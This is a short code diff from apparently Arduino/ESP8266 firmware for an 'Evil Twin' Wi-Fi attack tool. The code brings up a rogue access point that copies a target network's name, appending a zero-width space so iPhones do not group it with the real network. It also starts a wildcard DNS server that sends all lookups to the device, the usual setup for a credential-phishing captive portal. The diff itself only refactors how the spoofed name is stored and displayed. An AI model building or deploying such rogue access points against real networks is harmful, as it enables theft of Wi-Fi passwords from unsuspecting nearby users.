@@ -163,7 +163,6 @@ void acceptEvilTwinOrderOrFinishSignal(int numBytes) {
         //ok, do we have a new Evil AP to start?
         if (!evilAPName.equals(receivedEvilAPName)) {
           evilAPName = receivedEvilAPName;
-          evilAPName += "\u200B"; //avoid iPhone grouping
           //start attack on evilAP
           Serial.print("Starting Evil Twin for: ");
           Serial.println(evilAPName);
@@ -171,14 +170,15 @@ void acceptEvilTwinOrderOrFinishSignal(int numBytes) {
           display.clearDisplay();
           display.setCursor(0, 0);
           display.println("Working on: ");
-          display.println(evilAPName);
+          display.println(receivedEvilAPName);
           display.display();
 
           //start main evil twin access point:
 
           WiFi.mode(WIFI_AP);
           WiFi.softAPConfig(IPAddress(172, 0, 0, 1), IPAddress(172, 0, 0, 1), IPAddress(255, 255, 255, 0));
-          WiFi.softAP(evilAPName);
+          String evilApNameSSIDduplicate = receivedEvilAPName + "\u200B";  //avoid iPhone grouping
+          WiFi.softAP(evilApNameSSIDduplicate);
           dnsServer.start(DNS_PORT, "*", IPAddress(172, 0, 0, 1));
           WiFi.disconnect();
 
@@ -220,7 +220,6 @@ void setup() {
   display.println("Visit: 192.168.1.1");
   display.display();
   delay(100);
-
 }
 
 void handleResult() {
